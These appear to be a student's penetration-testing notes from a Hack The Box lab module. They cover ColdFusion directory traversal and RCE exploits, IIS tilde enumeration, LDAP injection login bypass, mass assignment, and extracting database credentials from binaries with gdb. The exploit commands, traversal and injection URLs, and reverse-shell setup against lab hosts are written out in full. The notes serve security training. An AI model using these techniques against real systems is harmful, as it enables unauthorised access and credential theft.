| `HTTP Headers`    | Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.                           |
| `Error Messages`  | If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.                                                                                                |
| `Default Files`   | ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.                       |

```
- NMap ports and service scan results

areaeric@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 11:45 GMT
Nmap scan report for 10.129.247.30
Host is up (0.028s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

	->  The port scan results show three open ports. 

	-> Two Windows RPC services, and one running on `8500`. As we know, `8500` is a default port that ColdFusion uses for SSL. 
	
	-> Navigating to the `IP:8500` lists 2 directories, `CFIDE` and `cfdocs,` in the root, further indicating that ColdFusion is running on port 8500.

	-> Navigating around the structure a bit shows lots of interesting info, from files with a clear `.cfm` extension to error messages and login pages.

	-> The `/CFIDE/administrator` path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that `ColdFusion 8` is running on the server.

## Questions
What ColdFusion protocol runs on port 5500?
	-> As mentioned in ## Overview, it is server monitor
```

#### Attacking ColdFusion 
```
## Overview
- Now that we know that ColdFusion 8 is a target, the next step is to check for existing known exploits. 

- Searchsploit
areaeric@htb[/htb]$ searchsploit adobe coldfusion

	-> As we know, the version of ColdFusion running is `ColdFusion 8`, and there are two results of interest.
	
	 -> The `Adobe ColdFusion - Directory Traversal` and the `Adobe ColdFusion 8 - Remote Command Execution (RCE)` results.

## Directory Traversal
- `Directory/Path Traversal` is an attack that allows an attacker to access files and directories outside of the intended directory in a web application.

	-> The attack exploits the lack of input validation in a web application and can be executed through various `input fields` such as `URL parameters`, `form fields`, `cookies`, and more. 
	
	-> By manipulating input parameters, the attacker can traverse the directory structure of the web application and `access sensitive files`, including `configuration files`, `user data`, and other system files. 
	
	-> The attack can be executed by manipulating the input parameters in ColdFusion tags such as `CFFile` and `CFDIRECTORY,` which are used for file and directory operations such as uploading, downloading, and listing files.

	-> Take the following ColdFusion code snippet:

<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>

- In this code snippet, the ColdFusion `cfdirectory` tag lists the contents of the `uploads` directory, and the `cfloop` tag is used to loop through the query results and display the filenames as clickable links in HTML.

- However, the `directory` parameter is not validated correctly, which makes the application vulnerable to a Path Traversal attack. An attacker can exploit this vulnerability by manipulating the `directory` parameter to access files outside the `uploads` directory.

http://example.com/index.cfm?directory=../../../etc/&file=passwd

- `CVE-2010-2861` is the `Adobe ColdFusion - Directory Traversal` exploit discovered by `searchsploit`. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.

	- `CFIDE/administrator/settings/mappings.cfm`
	- `logging/settings.cfm`
	- `datasources/index.cfm`
	- `j2eepackaging/editarchive.cfm`
	- `CFIDE/administrator/enter.cfm`

- These ColdFusion files are vulnerable to a directory traversal attack in `Adobe ColdFusion 9.0.1` and `earlier versions`. Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the `locale parameter` in these specific ColdFusion files.

- With this vulnerability, attackers can access files outside the intended directory by including `../` sequences in the file parameter. For example, consider the following URL:

http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en

- In this example, the URL attempts to access the `mappings.cfm` file in the `/CFIDE/administrator/settings/` directory of the web application with a specified `en` locale. 

	-> However, a directory traversal attack can be executed by manipulating the URL's locale parameter, allowing an attacker to read arbitrary files located outside of the intended directory, such as configuration files or system files.

http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd

- In this example, the `../` sequences have been used to replace a valid `locale` to traverse the directory structure and access the `passwd` file located in the `/etc/` directory.

	-> Using `searchsploit`, copy the exploit to a working directory and then execute the file to see what arguments it requires.

areaeric@htb[/htb]$ searchsploit -p 14641

  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable

Copied EDB-ID #14641's path to the clipboard

- Coldfusion - Exploitation

areaeric@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
areaeric@htb[/htb]$ python2 14641.py 

usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed

- Coldfusion - Exploitation
areaeric@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...

## Unauthenticated RCE
- In the context of ColdFusion web applications, an Unauthenticated RCE attack occurs when an attacker can execute arbitrary code on the server without requiring any authentication. 
	
	-> This can happen when a web application allows the execution of arbitrary code through a feature or function that does not require authentication, such as a debugging console or a file upload functionality. 
	
	-> Take the following code:
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">

	-> vulnerable to rce.

# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt

- An example of a ColdFusion Unauthenticated RCE attack is the `CVE-2009-2265` vulnerability that affected Adobe ColdFusion versions 8.0.1 and earlier. 

	-> This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host.
	-> The vulnerability exists in the FCKeditor package, and is accessible on the following path:

http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=

- Searchsploit

areaeric@htb[/htb]$ searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057areaeric@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .

- A quick `cat` review of the code indicates that the script needs some information. 
	->  Set the correct information and launch the exploit.

	-> Exploit modification

if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex

- Exploitation

areaeric@htb[/htb]$ python3 50057.py 

Generating a payload...

- Reverse Shell

C:\ColdFusion8\runtime\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\ColdFusion8\runtime\bin

22/03/2017  08:53 ��    <DIR>          .
22/03/2017  08:53 ��    <DIR>          ..

## Questions
What user is ColdFusion running as?
- Run unauthenticated RCE exploit (ref ## Unauthenticated RCE)
 python3 50057.py
-> get a shell
whoami
-> arctic\tolis
```

#### IIS Tilde Enumeration
```
## Overview
- IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the `8.3 format`) on some versions of Microsoft Internet Information Services (IIS) web servers. 

	-> This method takes advantage of a specific vulnerability in IIS, resulting from how it manages short file names within its directories.

- When a file or folder is created on an IIS server, Windows generates a short file name in the `8.3 format`, consisting of eight characters for the file name, a period, and three characters for the extension. 

	-> Intriguingly, these short file names can grant access to their corresponding files and folders, even if they were meant to be hidden or inaccessible.

- The tilde (`~`) character, followed by a sequence number, signifies a short file name in a URL. 

	-> Hence, if someone determines a file or folder's short file name, they can exploit the tilde character and the short file name in the URL to access sensitive data or hidden resources.

- IIS tilde directory enumeration primarily involves sending HTTP requests to the server with distinct character combinations in the URL to identify valid short file names. 

	-> Once a valid short file name is detected, this information can be utilised to access the relevant resource or further enumerate the directory structure.

- The enumeration process starts by sending requests with various characters following the tilde:

http://example.com/~a
http://example.com/~b
http://example.com/~c
...

- Assume the server contains a hidden directory named SecretDocuments. When a request is sent to `http://example.com/~s`, the server replies with a `200 OK` status code, revealing a directory with a short name beginning with "s". 

	-> The enumeration process continues by appending more characters:

http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...

- For the request `http://example.com/~se`, the server returns a `200 OK` status code, further refining the short name to "se". Further requests are sent, such as:

http://example.com/~sec
http://example.com/~sed
http://example.com/~see
...

- The server delivers a `200 OK` status code for the request `http://example.com/~sec`, further narrowing the short name to "sec".

- Continuing this procedure, the short name `secret~1` is eventually discovered when the server returns a `200 OK` status code for the request `http://example.com/~secret`.

- Once the short name `secret~1` is identified, enumeration of specific file names within that path can be performed, potentially exposing sensitive documents.

- For instance, if the short name `secret~1` is determined for the concealed directory SecretDocuments, files in that directory can be accessed by submitting requests such as:

http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx

- The same IIS tilde directory enumeration technique can also detect 8.3 short file names for files within the directory.

	-> After obtaining the short names, those files can be directly accessed using the short names in the requests.

http://example.com/secret~1/somefi~1.txt

- In 8.3 short file names, such as `somefi~1.txt`, the number "1" is a unique identifier that distinguishes files with similar names within the same directory. 
 
	-> The numbers following the tilde (`~`) assist the file system in differentiating between files that share similarities in their names, ensuring each file has a distinct 8.3 short file name.

- For example, if two files named `somefile.txt` and `somefile1.txt` exist in the same directory, their 8.3 short file names would be:
	
	- `somefi~1.txt` for `somefile.txt`
	- `somefi~2.txt` for `somefile1.txt`

## Enumeration
- Nmap - Open ports

areaeric@htb[/htb]$ nmap -p- -sV -sC --open 10.129.224.91
	-> IIS 7.5 is running on port 80. Executing a tilde enumeration attack on this version could be a viable option.

- Tilde Enumeration using IIS ShortName Scanner

	-> Manually sending HTTP requests for each letter of the alphabet can be a tedious process. 
	
	-> Fortunately, there is a tool called `IIS-ShortName-Scanner` that can automate this task. You can find it on GitHub at the following link: [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner). 

	-> When you run the below command, it will prompt you for a proxy, just hit enter for No.

areaeric@htb[/htb]$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP

	-> Upon executing the tool, it discovers 2 directories and 3 files. However, the target does not permit `GET` access to `http://10.129.204.231/TRANSF~1.ASP`, necessitating the brute-forcing of the remaining filename.

- Generate Wordlists
	-> The pwnbox image offers an extensive collection of wordlists located in the `/usr/share/wordlists/` directory, which can be utilised for this purpose.

areaeric@htb[/htb]$ egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt

	-> This command combines `egrep` and `sed` to filter and modify the contents of input files, then save the results to a new file.
```

|**Command Part**|**Description**|
|---|---|
|`egrep -r ^transf`|The `egrep` command is used to search for lines containing a specific pattern in the input files. The `-r` flag indicates a recursive search through directories. The `^transf` pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names.|
|`\|`|The pipe symbol (`\|`) is used to pass the output of the first command (`egrep`) to the second command (`sed`). In this case, the lines starting with "transf" and their file names will be the input for the `sed` command.|
|`sed 's/^[^:]*://'`|The `sed` command is used to perform a find-and-replace operation on its input (in this case, the output of `egrep`). The `'s/^[^:]*://'` expression tells `sed` to find any sequence of characters at the beginning of a line (`^`) up to the first colon (`:`), and replace them with nothing (effectively removing the matched text). The result will be the lines starting with "transf" but without the file names and colons.|
|`> /tmp/list.txt`|The greater-than symbol (`>`) is used to redirect the output of the entire command (i.e., the modified lines) to a new file named `/tmp/list.txt`.|

```
- Gobuster Enumeration
areaeric@htb[/htb]$ gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
===============================================================
/transf**.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
===============================================================
2023/03/23 15:14:11 Finished
===============================================================

	-> From the redacted output, you can see that `gobuster` has successfully identified an `.aspx` file as the full filename corresponding to the previously discovered short name `TRANSF~1.ASP`.

## Questions
What is the full .aspx filename that Gobuster identified?
- With the IIS_shortname_scanner + Gobuster Enumeration (ref to ## Enumeration)

java -jar iis_shortname_scanner.jar 0 5 http://10.129.193.161/
-> identified TRANSF~1.ASP as a file shortname

create wordlist:
egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt

Gobuster enumeration:

gobuster dir -u http://10.129.193.161/ -w /tmp/list.txt -x .aspx,.asp

-> yield transfer.aspx
```

#### LDAP
```
## Overview
- ldapsearch
	-> For example, `ldapsearch` is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service. 

areaeric@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"

- This command can be broken down as follows:

	- Connect to the server `ldap.example.com` on port `389`.
	- Bind (authenticate) as `cn=admin,dc=example,dc=com` with password `secret123`.
	- Search under the base DN `ou=people,dc=example,dc=com`.
	- Use the filter `(mail=john.doe@example.com)` to find entries that have this email address.

- The server would process the request and send back a response, which might look something like this:

dn: uid=jdoe,ou=people,dc=example,dc=com
objectClass: inetOrgPerson
objectClass: organizationalPerson
objectClass: person
objectClass: top
cn: John Doe
sn: Doe
uid: jdoe
mail: john.doe@example.com

result: 0 Success

	-> This response includes the entry's `distinguished name (DN)` that matches the search criteria and its attributes and values.

## LDAP injection
- `LDAP injection` is an attack that `exploits web applications that use LDAP` (Lightweight Directory Access Protocol) for authentication or storing user information. 
- 
	-> The attacker can `inject malicious code` or `characters` into LDAP queries to alter the application's behaviour, `bypass security measures`, and `access sensitive data` stored in the LDAP directory.

	-> To test for LDAP injection, you can use input values that contain `special characters or operators` that can change the query's meaning:
```


|Input|Description|
|---|---|
|`*`|An asterisk `*` can `match any number of characters`.|
|`( )`|Parentheses `( )` can `group expressions`.|
|`\|`|A vertical bar `\|` can perform `logical OR`.|
|`&`|An ampersand `&` can perform `logical AND`.|
|`(cn=*)`|Input values that try to bypass authentication or authorisation checks by injecting conditions that `always evaluate to true` can be used. For example, `(cn=*)` or `(objectClass=*)` can be used as input values for a username or password fields.|
```
- LDAP injection attacks are `similar to SQL injection attacks` but target the LDAP directory service instead of a database.

- For example, suppose an application uses the following LDAP query to authenticate users:

(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

- In this query, `$username` and `$password` contain the user's login credentials. An attacker could inject the `*` character into the `$username` or `$password` field to modify the LDAP query and bypass authentication.

- If an attacker injects the `*` character into the `$username` field, the LDAP query will match any user account with any password.

	-> This would allow the attacker to gain access to the application with any password, as shown below:

$username = "*";
$password = "dummy";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

- Alternatively, if an attacker injects the `*` character into the `$password` field, the LDAP query would match any user account with any password that contains the injected string. 
	-> This would allow the attacker to gain access to the application with any username, as shown below:

$username = "dummy";
$password = "*";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

- LDAP injection attacks can lead to `severe consequences`, such as `unauthorised access` to sensitive information, `elevated privileges`, and even `full control over the affected application or server`.

	-> These attacks can also considerably impact data integrity and availability, as attackers may `alter or remove data` within the directory service, causing disruptions to applications and services dependent on that data.

- To mitigate the risks associated with LDAP injection attacks, it is crucial to `thoroughly validate` and `sanitize user input` before incorporating it into LDAP queries. 

-> This process should involve `removing LDAP-specific special characters` like `*` and `employing parameterised queries` to ensure user input is `treated solely as data`, not executable code.

## Enumeration
- Nmap 
areaeric@htb[/htb]$ nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229

	-> nmap detects a `http` server running on port `80` and an `ldap` server running on port `389`

- Injection
	-> As `OpenLDAP` runs on the server, it is safe to assume that the web application running on port `80` uses LDAP for authentication.

	-> Attempting to log in using a wildcard character (`*`) in the username and password fields grants access to the system, effectively `bypassing any authentication measures that had been implemented`. 
	
		-> This is a `significant` security issue as it allows anyone with knowledge of the vulnerability to `gain unauthorised access` to the system and potentially sensitive data.

## Question
After bypassing the login, what is the website "Powered by"?
- Perform nmap scan on target (ref to ## Enumeration)
nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
-> discovered open-ldap running on port 389

-> logged in used ldap injection (username field) and saw: "Powered by w3.css"
```

#### Web Mass Assignment Vulnerabilities
```
## overview
- Web mass assignment vulnerability is a type of security vulnerability where attackers can modify the model attributes of an application through the parameters sent to the server. 
- 
	-> Reversing the code, attackers can see these parameters and by assigning values to critical unprotected parameters during the HTTP request, they can edit the data of a database and change the intended functionality of an application.

	-> Ruby on Rails is a web application framework that is vulnerable to this type of attack.
		-> The following example shows how attackers can exploit mass assignment vulnerability in Ruby on Rails. 
		-> Assuming we have a `User` model with the following attributes:

class User < ActiveRecord::Base
  attr_accessible :username, :email
end

- The above model specifies that only the `username` and `email` attributes are allowed to be mass-assigned. 

	-> However, attackers can modify other attributes by tampering with the parameters sent to the server. 
	
	-> Let's assume that the server receives the following parameters.

{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }

- Although the `User` model does not explicitly state that the `admin` attribute is accessible, the attacker can still change it because it is present in the arguments.
 
	-> Bypassing any access controls that may be in place, the attacker can send this data as part of a POST request to the server to establish a user with admin privileges.

## Exploiting Mass assignment Vulnerability.
- Suppose we come across the following application that features an Asset Manager web application. 

	-> Also suppose that the application's source code has been provided to us. Completing the registration step, we get the message `Success!!`, and we can try to log in.

- After login in, we get the message `Account is pending approval`.
 
	-> The administrator of this web app must approve our registration. Reviewing the python code of the `/opt/asset-manager/app.py` file reveals the following snippet.

for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:
    session['user']=i
    return redirect("/home",code=302)
  else:
    return render_template('login.html',value='Account is pending for approval')

- We can see that the application is checking if the value `k` is set. If yes, then it allows the user to log in. 

	-> In the code below, we can also see that if we set the `confirmed` parameter during registration, then it inserts `cond` as `True` and allows us to bypass the registration checking step.

try:
  if request.form['confirmed']:
    cond=True
except:
      cond=False
with sqlite3.connect("database.db") as con:
  cur = con.cursor()
  cur.execute('select * from users where username=?',(username,))
  if cur.fetchone():
    return render_template('index.html',value='User exists!!')
  else:
    cur.execute('insert into users values(?,?,?)',(username,password,cond))
    con.commit()
    return render_template('index.html',value='Success!!')

- In that case, what we should try is to register another user and try setting the `confirmed` parameter to a random value. 
 
	-> Using Burp Suite, we can capture the HTTP POST request to the `/register` page and set the parameters `username=new&password=test&confirmed=test`.

	-> We can now try to log in to the application using the `new:test` credentials.

	-> The mass assignment vulnerability is exploited successfully and we are now logged into the web app without waiting for the administrator to approve our registration request.

## Prevention
- To prevent this type of attack, one should explicitly assign the attributes for the allowed fields, or use whitelisting methods provided by the framework to check the attributes that can be mass-assigned.
 
	-> The following example shows how to use strong parameters in the `User` controller.

class UsersController < ApplicationController
  def create
    @user = User.new(user_params)
    if @user.save
      redirect_to @user
    else
      render 'new'
    end
  end

  private

  def user_params
    params.require(:user).permit(:username, :email)
  end
end

- In the example above, the `user_params` method returns a new hash that includes only the `username` and `email` attributes, ignoring any more input the client may have sent.
	-> By doing this, we ensure that only explicitly permitted attributes can be changed by mass assignment.

## Question
Q: We placed the source code of the application we just covered at /opt/asset-manager/app.py inside this exercise's target, but we changed the crucial parameter's name. SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application.

- Examining the source code in `app.py` yields (ref to ## Exploiting Mass Assignment Vulnerability):

@app.route('/register',methods=['GET','POST'])
def register():
        if request.method=='GET':
                return render_template('index.html')
        else:
                username=request.form['username']
                password=request.form['password']
                try:
                        if request.form['active']:
                                cond=True
                except:
                                cond=False
                with sqlite3.connect("database.db") as con:
                        cur = con.cursor()
                        cur.execute('select * from users where username=?',(username,))

-> so the parameter that needs to be manipulated is 'active'
```

#### Attacking Applications Connecting to Services
```
## Overview
- Applications that are connected to services often include connection strings that can be leaked if they are not protected sufficiently. 

	-> In the following paragraphs, we will go through the process of enumerating and exploiting applications that are connected to other services in order to extend their functionality. 
	
	-> This can help us collect information and move laterally or escalate our privileges during penetration testing.

## ELF Executable
- The `octopus_checker` binary is found on a remote machine during the testing. 
 
	-> Running the application locally reveals that it connects to database instances in order to verify that they are available.

areaeric@htb[/htb]$ ./octopus_checker 

Program had started..
Attempting Connection 
Connecting ... 

The driver reported the following diagnostics whilst running SQLDriverConnect

01000:1:0:[unixODBC][Driver Manager]Can't open lib 'ODBC Driver 17 for SQL Server' : file not found connected

- The binary probably connects using a SQL connection string that contains credentials. Using tools like [PEDA](https://github.com/longld/peda) (Python Exploit Development Assistance for GDB) we can further examine the file. 

	-> This is an extension of the standard GNU Debugger (GDB), which is used for debugging C and C++ programs. 
	
	-> GDB is a command line tool that lets you step through the code, set breakpoints, and examine and change variables.
	
	 -> Running the following command we can execute the binary through it.

areaeric@htb[/htb]$ gdb ./octopus_checker

- Once the binary is loaded, we set the `disassembly-flavor` to define the display style of the code, and we proceed with disassembling the main function of the program.

gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main

Dump of assembler code for function main:
   0x0000555555555456 <+0>:	endbr64 
   0x000055555555545a <+4>:	push   rbp
   0x000055555555545b <+5>:	mov    rbp,rsp
 
 <SNIP>
 
   0x0000555555555625 <+463>:	call   0x5555555551a0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x000055555555562a <+468>:	mov    rdx,rax
   0x000055555555562d <+471>:	mov    rax,QWORD PTR [rip+0x299c]        # 0x555555557fd0
   0x0000555555555634 <+478>:	mov    rsi,rax
   0x0000555555555637 <+481>:	mov    rdi,rdx
   0x000055555555563a <+484>:	call   0x5555555551c0 <_ZNSolsEPFRSoS_E@plt>
   0x000055555555563f <+489>:	mov    rbx,QWORD PTR [rbp-0x4a8]
   0x0000555555555646 <+496>:	lea    rax,[rbp-0x4b7]
   0x000055555555564d <+503>:	mov    rdi,rax
   0x0000555555555650 <+506>:	call   0x555555555220 <_ZNSaIcEC1Ev@plt>
   0x0000555555555655 <+511>:	lea    rdx,[rbp-0x4b7]
   0x000055555555565c <+518>:	lea    rax,[rbp-0x4a0]
   0x0000555555555663 <+525>:	lea    rsi,[rip+0xa34]        # 0x55555555609e
   0x000055555555566a <+532>:	mov    rdi,rax
   0x000055555555566d <+535>:	call   0x5555555551f0 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_@plt>
   0x0000555555555672 <+540>:	lea    rax,[rbp-0x4a0]
   0x0000555555555679 <+547>:	mov    edx,0x2
   0x000055555555567e <+552>:	mov    rsi,rbx
   0x0000555555555681 <+555>:	mov    rdi,rax
   0x0000555555555684 <+558>:	call   0x555555555329 <_Z13extract_errorNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPvs>
   0x0000555555555689 <+563>:	lea    rax,[rbp-0x4a0]
   0x0000555555555690 <+570>:	mov    rdi,rax
   0x0000555555555693 <+573>:	call   0x555555555160 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@plt>
   0x0000555555555698 <+578>:	lea    rax,[rbp-0x4b7]
   0x000055555555569f <+585>:	mov    rdi,rax
   0x00005555555556a2 <+588>:	call   0x5555555551d0 <_ZNSaIcED1Ev@plt>
   0x00005555555556a7 <+593>:	cmp    WORD PTR [rbp-0x4b2],0x0

<SNIP>

   0x0000555555555761 <+779>:	mov    rbx,QWORD PTR [rbp-0x8]
   0x0000555555555765 <+783>:	leave  
   0x0000555555555766 <+784>:	ret    
End of assembler dump.

- This reveals several call instructions that point to addresses containing strings. 
 
	-> They appear to be sections of a SQL connection string, but the sections are not in order, and the endianness entails that the string text is reversed. 
	
	-> Endianness defines the order that the bytes are read in different architectures. 
	
	-> Further down the function, we see a call to SQLDriverConnect.

   0x00005555555555ff <+425>:	mov    esi,0x0
   0x0000555555555604 <+430>:	mov    rdi,rax
   0x0000555555555607 <+433>:	call   0x5555555551b0 <SQLDriverConnect@plt>
   0x000055555555560c <+438>:	add    rsp,0x10
   0x0000555555555610 <+442>:	mov    WORD PTR [rbp-0x4b4],ax

- Adding a breakpoint at this address and running the program once again, reveals a SQL connection string in the RDX register address, containing the credentials for a local database instance.

gdb-peda$ b *0x5555555551b0

Breakpoint 1 at 0x5555555551b0


gdb-peda$ run

Starting program: /htb/rollout/octopus_checker 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Program had started..
Attempting Connection 
[----------------------------------registers-----------------------------------]
RAX: 0x55555556c4f0 --> 0x4b5a ('ZK')
RBX: 0x0 
RCX: 0xfffffffd 
RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
RSI: 0x0 
RDI: 0x55555556c4f0 --> 0x4b5a ('ZK')

<SNIP>

- Apart from trying to connect to the MS SQL service, penetration testers can also check if the password is reusable from users of the same network.

## DLL File Examination
- A DLL file is a `Dynamically Linked Library` and it contains code that is called from other programs while they are running. 
 
	-> The `MultimasterAPI.dll` binary is found on a remote machine during the enumeration process. 
	
	-> Examination of the file reveals that this is a .Net assembly.

C:\> Get-FileMetaData .\MultimasterAPI.dll

<SNIP>
M .NETFramework,Version=v4.6.1 TFrameworkDisplayName.NET Framework 4.6.1    api/getColleagues        ! htt
p://localhost:8081*POST         Ò^         øJ  ø,  RSDSœ»¡ÍuqœK£"Y¿bˆ   C:\Users\Hazard\Desktop\Stuff\Multimast
<SNIP>

- Using the debugger and .NET assembly editor [dnSpy](https://github.com/0xd4d/dnSpy), we can view the source code directly. 
	
	-> This tool allows reading, editing, and debugging the source code of a .NET assembly (C# and Visual Basic). 
	
	-> Inspection of `MultimasterAPI.Controllers` -> `ColleagueController` reveals a database connection string containing the password.

	-> Apart from trying to connect to the MS SQL service, attacks like password spraying can also be used to test the security of other services.

## Questions
What credentials were found for the local database instance while debugging the octopus_checker binary?

- First identified a binary `./octopus_checker` that is making connection to the SQL server (ref to ## ELF Executable Examination)
	-> Then reversed the binary using gdb debugger (breaking the start of calling SQLl  server), remeber to execute the binary once through fully following the instruction given.

gdb ./octopus_checker
set disassembly-flavor intel
disas main
b *0x5555555551b0
run
-> and we saw the oput 0x7fffffffde40 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;"
```

#### Other Notable Applications
```
## Overview
- Though this module focuses on nine specific applications, there are still many different ones that we may encounter in the wild. 
	
	-> I have performed large penetration tests where I ended up with an over 500-page EyeWitness report to go through.

- The module was designed to teach a methodology that can be applied to all other applications we may encounter.
 
	-> The list of applications we covered in this module covers the main functions and most of the objectives of the vast number of individual applications to increase the effectiveness of your internal and external assessments during your penetration tests.

- We covered enumerating the network and creating a visual representation of the applications within a network to ensure maximum coverage.

	-> We also covered a variety of ways that we can attack common applications, from fingerprinting and discovery to abusing built-in functionality and known public exploits. 
	
	-> The aim of the sections on osTicket and GitLab was not only to teach you how to enumerate and attack these specific applications but also to show how support desk ticketing systems and Git repository applications may yield fruit that can be useful elsewhere during an engagement.

- A big part of penetration testing is adapting to the unknown.

	-> Some testers may run a few scans and become discouraged when they don't see anything directly exploitable.
	
	 -> If we can dig through our scan data and filter out all of the noise, we will often find things that scanners miss, such as a Tomcat instance with weak or default credentials or a wide-open Git repository that gives us an SSH key or password that we can use elsewhere to gain access. 
	 
	 -> Having a deep understanding of the necessary methodology and mindset will make you successful, no matter if the target network has WordPress and Tomcat or a custom support ticketing system and a network monitoring system such as Nagios. 
	 
	 -> Ensure that you understand the various techniques taught for footprinting these applications and the curiosity to explore an unknown application. 
	 
	 -> You will come across applications not listed in this module. Similar to what I did with the Nexus Repository OSS application in the introduction section, you can apply these principles to find issues like default credentials and built-in functionality leading to remote code execution.

## Honorable Mentions
- That being said, here are a few other applications that we have come across during assessments and are worth looking out for:
```

|Application|Abuse Info|
|---|---|
